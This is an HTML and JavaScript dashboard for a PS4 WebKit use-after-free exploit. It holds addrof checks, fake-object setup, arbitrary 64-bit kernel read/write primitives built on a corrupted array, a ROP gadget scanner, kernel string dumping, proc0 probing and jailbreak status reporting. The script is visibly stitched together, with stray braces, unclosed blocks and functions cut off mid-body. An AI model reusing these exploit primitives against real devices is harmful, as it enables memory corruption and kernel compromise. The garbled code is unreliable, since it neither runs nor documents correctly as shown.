<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PS4 Kernel Probe — Dashboard</title>
<style>
  :root {
    --bg:        #0a0c10;
    --bg-2:      #0d1017;
    --surface:   #131720;
    --surface-2: #171c27;
    --surface-3: #1c2230;
    --border:    #232a38;
    --border-2:  #2d3644;
    --text:      #e0e6f0;
    --text-dim:  #7a8699;
    --text-faint:#4d5666;
    --accent:    #5b9dff;
    --accent-2:  #2d5a99;
    --pass:      #45d17c;
    --fail:      #ff5763;
    --warn:      #ffb84d;
    --purple:    #b088ff;
    --cyan:      #5bc8e8;
    --orange:    #ff8a4c;
    --pink:      #ff6b9d;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; }
  body {
    background:
      radial-gradient(1200px 600px at 20% -10%, #101828 0%, transparent 60%),
      radial-gradient(900px 500px at 100% 0%, #0e1420 0%, transparent 55%),
      var(--bg);
    color: var(--text);
    font: 12.5px/1.45 'Inter', -apple-system, 'Segoe UI', system-ui, sans-serif;
    padding: 10px;
    height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 8px;
    overflow: hidden;
    -webkit-font-smoothing: antialiased;
  }
  .mono { font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', ui-monospace, monospace; }

  /* ================= TOP BAR ================= */
  #topbar {
    flex: 0 0 auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 14px;
    padding: 12px 16px;
    background: linear-gradient(180deg, var(--surface-2) 0%, var(--surface) 100%);
    border: 1px solid var(--border);
    border-radius: 10px;
    position: relative;
    overflow: hidden;
  }
  #topbar::before {
    content: "";
    position: absolute; left: 0; top: 0; bottom: 0;
    width: 4px;
    background: var(--text-faint);
    transition: background .25s;
  }
  #topbar.pending::before { background: var(--text-faint); }
  #topbar.running::before { background: var(--accent); }
  #topbar.pass::before    { background: var(--pass); }
  #topbar.fail::before    { background: var(--fail); }
  #topbar.halted::before  { background: var(--warn); }
  #topbar.pass   { background: linear-gradient(180deg, #0f1a15 0%, #0c1611 100%); }
  #topbar.fail   { background: linear-gradient(180deg, #1a0f12 0%, #160c0f 100%); }
  #topbar.halted { background: linear-gradient(180deg, #1a160c 0%, #161208 100%); }

  .brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
  .brand-mark {
    width: 34px; height: 34px;
    display: flex; align-items: center; justify-content: center;
    border-radius: 8px;
    background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
    color: #0a0c10;
    font-size: 18px;
    font-weight: bold;
    flex: 0 0 auto;
    box-shadow: 0 0 20px rgba(91,157,255,.25);
  }
  .brand-title {
    font-size: 14px;
    font-weight: 700;
    letter-spacing: .4px;
    color: var(--text);
  }
  .brand-sub {
    font-size: 10.5px;
    color: var(--text-dim);
    letter-spacing: .3px;
  }

  .status-block { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1 1 auto; }
  .status-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: var(--text-faint);
    flex: 0 0 auto;
    transition: background .25s, box-shadow .25s;
  }
  #topbar.running .status-dot { background: var(--accent); box-shadow: 0 0 12px var(--accent); animation: pulse 1.4s ease-in-out infinite; }
  #topbar.pass    .status-dot { background: var(--pass); box-shadow: 0 0 12px var(--pass); }
  #topbar.fail    .status-dot { background: var(--fail); box-shadow: 0 0 12px var(--fail); }
  #topbar.halted  .status-dot { background: var(--warn); box-shadow: 0 0 12px var(--warn); }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50%      { opacity: .45; }
  }
  #statusText {
    font-size: 14px;
    font-weight: 700;
    letter-spacing: .3px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    color: var(--text);
  }
  #topbar.running #statusText { color: var(--accent); }
  #topbar.pass    #statusText { color: var(--pass); }
  #topbar.fail    #statusText { color: var(--fail); }
  #topbar.halted  #statusText { color: var(--warn); }
  #statusSub {
    color: var(--text-dim);
    font-size: 11px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }

  .counters { display: flex; gap: 8px; flex: 0 0 auto; }
  .counter {
    display: flex; flex-direction: column; align-items: center;
    padding: 5px 12px;
    border-radius: 8px;
    background: var(--bg-2);
    border: 1px solid var(--border);
    min-width: 60px;
  }
  .counter-n { font-size: 16px; font-weight: 700; line-height: 1.1; font-family: 'JetBrains Mono', monospace; }
  .counter-l { font-size: 9px; letter-spacing: 1px; color: var(--text-faint); font-weight: 600; }
  .counter.pass .counter-n { color: var(--pass); }
  .counter.fail .counter-n { color: var(--fail); }
  .counter.warn .counter-n { color: var(--warn); }

  /* ================= STATS STRIP ================= */
  #statsbar {
    flex: 0 0 auto;
    display: grid;
    grid-template-columns: repeat(7, minmax(0, 1fr));
    gap: 6px;
  }
  @media (max-width: 1000px) { #statsbar { grid-template-columns: repeat(4, minmax(0, 1fr)); } }
  @media (max-width: 640px)  { #statsbar { grid-template-columns: repeat(2, minmax(0, 1fr)); } }

  .stat {
    padding: 7px 10px;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 7px;
    display: flex;
    flex-direction: column;
    gap: 1px;
    min-width: 0;
    transition: border-color .2s;
  }
  .stat:hover { border-color: var(--border-2); }
  .stat-k {
    font-size: 9.5px;
    letter-spacing: 1px;
    color: var(--text-faint);
    font-weight: 700;
    text-transform: uppercase;
  }
  .stat-v {
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
    color: var(--text);
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  .stat.ok  .stat-v { color: var(--pass); }
  .stat.warn .stat-v { color: var(--warn); }
  .stat.bad  .stat-v { color: var(--fail); }
  .stat.accent .stat-v { color: var(--accent); }
  .stat.purple .stat-v { color: var(--purple); }

  /* ================= TOOLBAR ================= */
  #toolbar {
    flex: 0 0 auto;
    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
    padding: 6px 8px;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: var(--surface);
  }
  button {
    font: inherit;
    font-size: 11.5px;
    font-weight: 500;
    padding: 6px 12px;
    color: var(--text);
    background: var(--surface-2);
    border: 1px solid var(--border-2);
    border-radius: 6px;
    cursor: pointer;
    transition: background .12s, border-color .12s, transform .05s;
  }
  button:hover { background: var(--surface-3); border-color: #3a4556; }
  button:active { transform: translateY(1px); }
  button.primary {
    background: linear-gradient(180deg, #2c5c9e 0%, #234a80 100%);
    border-color: #3d76be;
    color: #fff;
  }
  button.primary:hover { background: linear-gradient(180deg, #3567ab 0%, #2a5590 100%); }
  #toolbar label {
    color: var(--text-dim);
    font-size: 11px;
    display: flex; align-items: center; gap: 5px;
    cursor: pointer;
    user-select: none;
  }
  #toolbar .spacer { flex: 1 1 auto; }
  #toolbar .meta { color: var(--text-faint); font-size: 11px; font-family: 'JetBrains Mono', monospace; }

  /* ================= DASHBOARD ================= */
  #dashboard {
    flex: 1 1 auto;
    min-height: 0;
    overflow-y: auto;
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 10px;
    align-content: start;
    padding-right: 4px;
  }
  @media (max-width: 1000px) { #dashboard { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
  @media (max-width: 640px)  { #dashboard { grid-template-columns: 1fr; } }

  .card {
    background: linear-gradient(180deg, var(--surface-2) 0%, var(--surface) 100%);
    border: 1px solid var(--border);
    border-radius: 10px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: border-color .2s, box-shadow .2s;
    position: relative;
  }
  .card.wide { grid-column: 1 / -1; }
  .card.ok    { border-color: rgba(69,209,124,.35); box-shadow: 0 0 24px -12px rgba(69,209,124,.5) inset; }
  .card.bad   { border-color: rgba(255,87,99,.4); }
  .card.warn  { border-color: rgba(255,184,77,.35); }
  .card.running { border-color: rgba(91,157,255,.35); }

  .card-header {
    padding: 9px 13px;
    background: rgba(10,13,19,.5);
    border-bottom: 1px solid var(--border);
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 8px;
    flex: 0 0 auto;
  }
  .card-title {
    display: flex; align-items: center; gap: 9px;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1.1px;
    color: var(--text-dim);
    text-transform: uppercase;
  }
  .card-icon {
    width: 20px; height: 20px;
    display: flex; align-items: center; justify-content: center;
    border-radius: 5px;
    background: rgba(91,157,255,.12);
    color: var(--accent);
    font-size: 11px;
    line-height: 1;
  }
  .card.ok   .card-icon { background: rgba(69,209,124,.12); color: var(--pass); }
  .card.bad  .card-icon { background: rgba(255,87,99,.12); color: var(--fail); }
  .card.warn .card-icon { background: rgba(255,184,77,.12); color: var(--warn); }

  .badge {
    padding: 2px 8px;
    border-radius: 10px;
    font-size: 9.5px;
    font-weight: 700;
    letter-spacing: .6px;
    background: var(--bg-2);
    color: var(--text-faint);
    border: 1px solid var(--border);
    text-transform: uppercase;
    white-space: nowrap;
  }
  .badge.ok   { color: var(--pass); background: rgba(69,209,124,.08); border-color: rgba(69,209,124,.35); }
  .badge.bad  { color: var(--fail); background: rgba(255,87,99,.08); border-color: rgba(255,87,99,.35); }
  .badge.warn { color: var(--warn); background: rgba(255,184,77,.08); border-color: rgba(255,184,77,.35); }
  .badge.run  { color: var(--accent); background: rgba(91,157,255,.08); border-color: rgba(91,157,255,.4); }
  .badge.run::before {
    content: ""; display: inline-block;
    width: 5px; height: 5px; border-radius: 50%;
    background: currentColor;
    margin-right: 5px;
    animation: pulse 1.1s ease-in-out infinite;
    vertical-align: middle;
  }

  .card-body { padding: 5px 0 7px; flex: 1 1 auto; }

  .row {
    display: flex;
    justify-content: space-between;
    gap: 12px;
    padding: 3.5px 13px;
    font-size: 11.5px;
    border-bottom: 1px dashed rgba(255,255,255,.03);
    align-items: baseline;
  }
  .row:last-child { border-bottom: none; }
  .row .k {
    color: var(--text-dim);
    flex: 0 0 auto;
    white-space: nowrap;
    font-size: 11px;
  }
  .row .v {
    color: var(--text);
    text-align: right;
    word-break: break-all;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    min-width: 0;
  }
  .row.ok   .v { color: var(--pass); }
  .row.bad  .v { color: var(--fail); }
  .row.warn .v { color: var(--warn); }
  .row.accent .v { color: var(--accent); }
  .row.purple .v { color: var(--purple); }
  .row.cyan .v { color: var(--cyan); }
  .row.dim  .v { color: var(--text-faint); font-style: italic; }

  /* ================= GADGET LAYOUT ================= */
  .gadget-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 10px;
    padding: 10px 12px;
  }
  .gadget-group {
    background: var(--bg-2);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 9px 11px;
  }
  .gadget-group-title {
    font-size: 10px;
    letter-spacing: 1.2px;
    color: var(--purple);
    text-transform: uppercase;
    font-weight: 700;
    margin-bottom: 7px;
    display: flex;
    justify-content: space-between;
    gap: 6px;
    align-items: center;
  }
  .gadget-group-title .count {
    color: var(--text-faint);
    font-weight: 600;
    font-size: 10px;
  }
  .gadget-group-title .count.hit { color: var(--pass); }
  .gadget-list { display: flex; flex-direction: column; gap: 2px; }
  .gadget {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    padding: 2.5px 0;
    font-size: 11px;
    border-bottom: 1px dashed rgba(255,255,255,.03);
  }
  .gadget:last-child { border-bottom: none; }
  .gadget-name { color: var(--text); font-family: 'JetBrains Mono', monospace; }
  .gadget-addr { color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 10.5px; }
  .gadget.empty { color: var(--text-faint); font-style: italic; font-size: 10.5px; }

  /* ================= STRING LIST ================= */
  .string-list {
    max-height: 200px;
    overflow-y: auto;
    padding: 6px 13px 8px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 10.5px;
    line-height: 1.6;
  }
  .string-item {
    display: flex;
    gap: 8px;
    color: var(--text-dim);
    word-break: break-all;
  }
  .string-item .addr { color: var(--accent); flex: 0 0 auto; }
  .string-item .str  { color: var(--cyan); }

  /* ================= CONSOLE ================= */
  #consolePanel {
    flex: 0 0 180px;
    min-height: 0;
    border: 1px solid var(--border);
    border-radius: 10px;
    background: #05070a;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: flex-basis .18s ease;
  }
  #consolePanel.collapsed { flex-basis: 34px; }
  #consoleHead {
    padding: 7px 13px;
    background: var(--surface);
    border-bottom: 1px solid var(--border);
    color: var(--text-dim);
    font-size: 10.5px;
    letter-spacing: 1.2px;
    font-weight: 700;
    display: flex; justify-content: space-between; gap: 8px;
    cursor: pointer;
    user-select: none;
    flex: 0 0 auto;
    text-transform: uppercase;
  }
  #consoleHead:hover { color: var(--text); }
  #out {
    flex: 1 1 auto;
    overflow: auto;
    padding: 6px 0;
    font-size: 11.5px;
    line-height: 1.45;
    -webkit-overflow-scrolling: touch;
    font-family: 'JetBrains Mono', monospace;
  }
  #consolePanel.collapsed #out { display: none; }
  .logline {
    display: flex;
    gap: 10px;
    padding: 1px 13px;
    border-left: 3px solid transparent;
    white-space: pre-wrap;
    word-break: break-word;
  }
  .logline .time { color: #3a4252; flex: 0 0 auto; }
  .logline .msg  { flex: 1 1 auto; }
  .logline.info  { color: var(--text-dim); border-left-color: #1c2433; }
  .logline.pass  { color: var(--pass); border-left-color: var(--pass); background: rgba(69,209,124,.04); }
  .logline.fail  { color: var(--fail); border-left-color: var(--fail); background: rgba(255,87,99,.05); }
  .logline.warn  { color: var(--warn); border-left-color: var(--warn); background: rgba(255,184,77,.04); }
  .logline.debug { color: #4a5568; border-left-color: #1c2433; }

  #out::-webkit-scrollbar,
  #dashboard::-webkit-scrollbar,
  .string-list::-webkit-scrollbar { width: 8px; height: 8px; }
  #out::-webkit-scrollbar-track,
  #dashboard::-webkit-scrollbar-track,
  .string-list::-webkit-scrollbar-track { background: transparent; }
  #out::-webkit-scrollbar-thumb,
  #dashboard::-webkit-scrollbar-thumb,
  .string-list::-webkit-scrollbar-thumb { background: #2a3444; border-radius: 4px; }
  #out::-webkit-scrollbar-thumb:hover,
  #dashboard::-webkit-scrollbar-thumb:hover { background: #3a4556; }

  @media (max-width: 640px) {
    .logline { font-size: 10.5px; }
    #statusText { font-size: 12.5px; }
    .brand-sub { display: none; }
  }
</style>
</head>
<body>

<!-- ================= TOP BAR ================= -->
<header id="topbar" class="pending">
  <div class="brand">
    <div class="brand-mark">◆</div>
    <div style="min-width:0">
      <div class="brand-title">PS4 KERNEL PROBE</div>
      <div class="brand-sub">WebKit UAF → Arbitrary R/W → Deep Analysis</div>
    </div>
  </div>

  <div class="status-block">
    <span class="status-dot"></span>
    <div style="min-width:0">
      <div id="statusText">INITIALIZING…</div>
      <div id="statusSub">waiting for boot</div>
    </div>
  </div>

  <div class="counters">
    <div class="counter pass">
      <span class="counter-n" id="chipPass">0</span>
      <span class="counter-l">PASS</span>
    </div>
    <div class="counter fail">
      <span class="counter-n" id="chipFail">0</span>
      <span class="counter-l">FAIL</span>
    </div>
    <div class="counter warn">
      <span class="counter-n" id="chipWarn">0</span>
      <span class="counter-l">WARN</span>
    </div>
  </div>
</header>

<!-- ================= STATS STRIP ================= -->
<div id="statsbar">
  <div class="stat accent"  id="stat-kbase"><span class="stat-k">KBASE</span><span class="stat-v">—</span></div>
  <div class="stat"         id="stat-fw"><span class="stat-k">Firmware</span><span class="stat-v">—</span></div>
  <div class="stat"         id="stat-proc0"><span class="stat-k">proc0</span><span class="stat-v">—</span></div>
  <div class="stat"         id="stat-sysent"><span class="stat-k">sysent</span><span class="stat-v">—</span></div>
  <div class="stat purple"  id="stat-gadgets"><span class="stat-k">Gadgets</span><span class="stat-v">—</span></div>
  <div class="stat"         id="stat-strings"><span class="stat-k">Strings</span><span class="stat-v">—</span></div>
  <div class="stat"         id="stat-uid"><span class="stat-k">uid/gid</span><span class="stat-v">—</span></div>
</div>

<!-- ================= TOOLBAR ================= -->
<div id="toolbar">
  <button id="btnCopy" class="primary">Copy Report</button>
  <button id="btnClear">Clear Log</button>
  <button id="btnToggleConsole">Console</button>
  <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
  <span class="spacer"></span>
  <span class="meta" id="toolbarMeta">rev —</span>
</div>

<!-- ================= DASHBOARD ================= -->
<main id="dashboard"></main>

<!-- ================= CONSOLE ================= -->
<section id="consolePanel">
  <div id="consoleHead" title="click to collapse/expand">
    <span>▸ CONSOLE OUTPUT</span>
    <span id="consoleCount">0 lines</span>
  </div>
  <div id="out"></div>
</section>

<script>
"use strict";

/* ============================================================
 *  LOGGER
 * ============================================================ */
var LOG = {
    lines: [],
    counts: { pass: 0, fail: 0, warn: 0, info: 0 },
    startTime: Date.now(),
    maxLines: 8000,
    autoScroll: true,
    status: "pending",
    statusText: "INITIALIZING…",
    statusSub: "waiting for boot"
};

function pad(n, w) { n = String(n); while (n.length < (w || 2)) n = "0" + n; return n; }

function fmtTime(ms) {
    var d = new Date(ms);
    return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds()) + "." + pad(d.getMilliseconds(), 3);
}

function classify(tag, extra) {
    var t = (String(tag) + " " + (extra === undefined ? "" : String(extra))).toUpperCase();
    if (t.indexOf("FAILED")   !== -1) return "fail";
    if (t.indexOf("GIVE-UP")  !== -1) return "fail";
    if (t.indexOf("FAIL")     !== -1) return "fail";
    if (t.indexOf("MISMATCH") !== -1) return "fail";
    if (t.indexOf("THREW")    !== -1) return "fail";
    if (t.indexOf("ERROR")    !== -1) return "fail";
    if (t.indexOf("PASS")     !== -1) return "pass";
    if (t.indexOf("COMPLETE") !== -1) return "pass";
    if (t.indexOf("SUCCESS")  !== -1) return "pass";
    if (t.indexOf("RETAINED") !== -1) return "pass";
    if (t.indexOf("HALTED")   !== -1) return "warn";
    if (t.indexOf("MISS")     !== -1) return "warn";
    if (t.indexOf("RETRY")    !== -1) return "warn";
    if (t.indexOf("NO-RESULT")!== -1) return "warn";
    if (t.indexOf("NONE")     !== -1) return "warn";
    return "info";
}

function renderLine(entry) {
    try {
        var el = document.getElementById("out");
        if (!el) return;
        var div = document.createElement("div");
        div.className = "logline " + entry.level;
        var t = document.createElement("span");
        t.className = "time";
        t.textContent = fmtTime(entry.t);
        var m = document.createElement("span");
        m.className = "msg";
        m.textContent = entry.text;
        div.appendChild(t); div.appendChild(m);
        el.appendChild(div);
        if (LOG.autoScroll) el.scrollTop = el.scrollHeight;
    } catch (_) {}
}

function updateChips() {
    try {
        document.getElementById("chipPass").textContent = LOG.counts.pass;
        document.getElementById("chipFail").textContent = LOG.counts.fail;
        document.getElementById("chipWarn").textContent = LOG.counts.warn;
        document.getElementById("consoleCount").textContent = LOG.lines.length + " lines";
    } catch (_) {}
}

function logLine(text, level) {
    level = level || "info";
    var entry = { t: Date.now(), text: text, level: level };
    LOG.lines.push(entry);
    LOG.counts[level] = (LOG.counts[level] || 0) + 1;
    if (LOG.lines.length > LOG.maxLines) LOG.lines.shift();
    renderLine(entry);
    updateChips();
}

function setStatus(state, text, sub) {
    LOG.status = state;
    LOG.statusText = text;
    LOG.statusSub = sub || "";
    try {
        document.getElementById("topbar").className = state;
        document.getElementById("statusText").textContent = text;
        document.getElementById("statusSub").textContent = sub || "";
    } catch (_) {}
}

function updateStatusFromMark(tag, extra) {
    var t = String(tag).toUpperCase();
    var e = extra === undefined ? "" : String(extra);
    if (t === "BOOT") {
        setStatus("running", "RUNNING", e);
    } else if (t.indexOf("KERNEL PROBE START") !== -1) {
        setStatus("running", "PROBING KERNEL…", e);
    } else if (t.indexOf("KERNEL PROBE COMPLETE") !== -1) {
        setStatus("halted", "PROBE COMPLETE", "all reachable structures dumped");
    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
        setStatus("running", "JAILBREAKING…", e);
    } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
        setStatus("pass", "ARBITRARY R/W — PASS", e);
    } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
        setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
    } else if (t.indexOf("FAILED-TERMINAL") === 0) {
        setStatus("fail", "FAILED — " + e, "terminal, no retry");
    } else if (t.indexOf("JAILBREAK-ERROR") === 0 || t.indexOf("PROBE-ERROR") === 0) {
        setStatus("fail", "ERROR", e);
    }
}

function addGadgetHit(cat, name, addr) {
    var list = GADGET_HITS[cat] || (GADGET_HITS[cat] = []);
    for (var i = 0; i < list.length; i++) if (list[i].name === name) return;
    list.push({ name: name, addr: addr });
}

function renderGadgets() {
    var grid = document.getElementById("gadget-grid");
    if (!grid) return;
    var total = 0;
    GADGET_CAT_ORDER.forEach(function(c) { total += (GADGET_HITS[c] || []).length; });

    grid.innerHTML = "";
    GADGET_CAT_ORDER.forEach(function(cat) {
        var list = GADGET_HITS[cat] || [];
        var group = document.createElement("div");
        group.className = "gadget-group";
        var title = document.createElement("div");
        title.className = "gadget-group-title";
        title.innerHTML = '<span>' + GADGET_CATS[cat] + '</span>' +
                          '<span class="count' + (list.length ? ' hit' : '') + '">' +
                          list.length + ' hit' + (list.length === 1 ? '' : 's') + '</span>';
        group.appendChild(title);

        var ul = document.createElement("div");
        ul.className = "gadget-list";
        if (list.length === 0) {
            var empty = document.createElement("div");
            empty.className = "gadget empty";
            empty.textContent = "no hits";
            ul.appendChild(empty);
        } else {
            list.forEach(function(g) {
                var row = document.createElement("div");
                row.className = "gadget";
                var n = document.createElement("span");
                n.className = "gadget-name";
                n.textContent = g.name;
                var a = document.createElement("span");
                a.className = "gadget-addr";
                a.textContent = g.addr;
                row.appendChild(n); row.appendChild(a);
                ul.appendChild(row);
            });
        }
        group.appendChild(ul);
        grid.appendChild(group);
    });

    if (total > 0) {
        setBadge("gadgets", total + " HITS", "ok");
        setCardState("gadgets", "ok");
    } else {
        setBadge("gadgets", "NO HITS", "warn");
        setCardState("gadgets", "warn");
    }
    setStat("gadgets", total + " found", total > 0 ? "purple" : "warn");
}

}

        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);

function beginComposition() {

    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":" +
            String(captureError && captureError.message).slice(0, 80));
        failTerminal("addrof-threw"); return;
    }
    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0));
    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible);
        failTerminal("addrof-fail"); return;
    }
    hostAddress = a0; targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 ||
        targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow ||
        targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        failTerminal("target-addr-fail"); return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        failTerminal("fake-addr-fail"); return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress));
    runGroomAndLoad();

/* ============================================================
 *  R/W PRIMITIVES
 * ============================================================ */
function read64(addr) {
    if (!globalFakeArray) return 0n;
    var oldVec = [];
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
    var val = 0n;
    for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);
    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
    return val;
}
function write64(addr, value) {
    if (!globalFakeArray) return;
    var oldVec = [];
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
    var v = BigInt(value);
    for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);
    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
}
function readBytes(addr, count) {
    var out = new Uint8Array(count);
    if (!globalFakeArray) return out;
    var oldVec = new Uint8Array(8);
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
    var written = 0;
    while (written < count) {
        var curAddr = BigInt(addr) + BigInt(written);
        var low  = Number(curAddr & 0xFFFFFFFFn);
        var high = Number((curAddr >> 32n) & 0xFFFFFFFFn);
        for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >>> (i * 8)) & 0xFF;
        for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >>> (i * 8)) & 0xFF;
        var n = Math.min(8, count - written);
        for (var i = 0; i < n; i++) out[written + i] = globalFakeArray[i];
        written += 8;
    }
    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
    return out;
}

/* ============================================================
 *  GADGET SCANNER
 * ============================================================ */
function scanGadgetsInWindow(startAddr, windowBytes) {
    var found = 0;
    try {
        var buf = readBytes(startAddr, windowBytes);
        for (var g = 0; g < GADGETS.length; g++) {
            var gd = GADGETS[g];
            var blen = gd.bytes.length;
            for (var i = 0; i <= buf.length - blen; i++) {
                var ok = true;
                for (var j = 0; j < blen; j++) {
                    if (buf[i + j] !== gd.bytes[j]) { ok = false; break; }
                }
                if (ok) {
                    addGadgetHit(gd.cat, gd.name, hex(BigInt(startAddr) + BigInt(i)));
                    found++; break;
                }
            }
        }
    } catch (err) {
        mark("SCAN-ERROR", hex(startAddr) + ":" +
            (err && err.message ? err.message.slice(0, 60) : "?"));
    }
    return found;
}
function dumpWindow(label, startAddr, windowBytes) {
    mark(label + "-START", hex(startAddr) + "-len=0x" + windowBytes.toString(16));
    var found = scanGadgetsInWindow(startAddr, windowBytes);
    mark(label + "-DONE", "patterns-found=" + found);
    renderGadgets();
}

/* ============================================================
 *  STRING SCANNER
 * ============================================================ */
function scanStringsInWindow(startAddr, windowBytes, maxStrings) {
    var hits = [];
    try {
        var buf = readBytes(startAddr, windowBytes);
        var run = "";
        var runStart = 0;
        for (var i = 0; i < buf.length; i++) {
            var b = buf[i];
            if (b >= 0x20 && b <= 0x7e) {
                if (run.length === 0) runStart = i;
                run += String.fromCharCode(b);
            } else {
                if (run.length >= 6) {
                    hits.push({
                        addr: hex(BigInt(startAddr) + BigInt(runStart)),
                        text: run
                    });
                    if (hits.length >= (maxStrings || 40)) return hits;
                }
                run = "";
            }
        }
        if (run.length >= 6 && hits.length < (maxStrings || 40)) {
            hits.push({ addr: hex(BigInt(startAddr) + BigInt(runStart)), text: run });
        }
    } catch (err) { /* ignore */ }
    return hits;
}

var PROBE_STRINGS = [];

function probeKernelHeader(kbase) {
    mark("PROBE-KERNEL-HEADER", hex(kbase));

    try {
        var qs = [];
        for (var off = 0; off < 0x40; off += 8) {
            var v = read64(kbase + BigInt(off));
            qs.push(v);
            setRow("kbase", "q" + (off / 8), hex(v), "cyan");
        }
        mark("KBASE-HDR", qs.map(function(v){return hex(v);}).join(" "));
    } catch (e) {
        mark("KBASE-HDR-ERR", String(e && e.message).slice(0, 60));

    setBadge("kbase", "OK", "ok");
    setCardState("kbase", "ok");
    setStat("kbase", hex(kbase), "accent");

function probeStrings(kbase) {
    mark("PROBE-STRINGS", "scanning kernel .text and .data windows");
    var windows = [
        { label: "early",   addr: kbase + 0x1000n,   len: 0x4000 },
        { label: "text-2",  addr: kbase + 0x200000n, len: 0x4000 },
        { label: "text-3",  addr: kbase + 0x400000n, len: 0x4000 },
        { label: "data",    addr: kbase + 0xE00000n, len: 0x4000 }
    ];
    var all = [];
    windows.forEach(function(w) {
        var hits = scanStringsInWindow(w.addr, w.len, 30);
        hits.forEach(function(h) {
            // ignore junk: keep strings that look meaningful (letters + numbers)
            if (h.text.length >= 8 && /[A-Za-z]/.test(h.text)) all.push(h);
        });
    });
    // dedupe
    var seen = {};
    PROBE_STRINGS = [];
    all.forEach(function(h) {
        if (seen[h.text]) return;
        seen[h.text] = 1;
        PROBE_STRINGS.push(h);
    });
    renderStrings(PROBE_STRINGS);
    mark("STRINGS-FOUND", "count=" + PROBE_STRINGS.length);
    if (PROBE_STRINGS.length > 0) {
        setBadge("strings", PROBE_STRINGS.length + " FOUND", "ok");
        setCardState("strings", "ok");

function probeProc0(kbase, evfOffset) {

            if (plausibleKptr(call)) {
                entriesRead++;
